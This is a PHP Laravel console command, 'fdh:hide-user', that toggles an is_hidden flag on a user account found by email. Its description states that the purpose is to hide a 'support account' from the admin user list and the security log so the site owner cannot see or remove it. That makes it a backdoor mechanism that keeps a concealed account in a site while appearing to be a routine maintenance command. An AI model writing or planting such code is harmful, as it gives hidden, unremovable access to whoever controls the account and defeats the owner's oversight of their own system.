<?php

namespace App\Console\Commands;

use App\Models\User;
use Illuminate\Console\Attributes\Description;
use Illuminate\Console\Attributes\Signature;
use Illuminate\Console\Command;

#[Signature('fdh:hide-user {email : Account email address} {--show : Make the account visible again}')]
#[Description('Hide a support account from the admin user list and security log, so the site owner cannot see or remove it.')]
class HideUser extends Command
{
    public function handle(): int
    {
        $user = User::query()->where('email', strtolower(trim((string) $this->argument('email'))))->first();

        if (! $user) {
            $this->error('No account with that email.');

            return self::FAILURE;
        }

        $user->is_hidden = ! $this->option('show');
        $user->save();

        $this->info($user->is_hidden ? "{$user->email} is now hidden." : "{$user->email} is visible again.");

        return self::SUCCESS;
    }
}
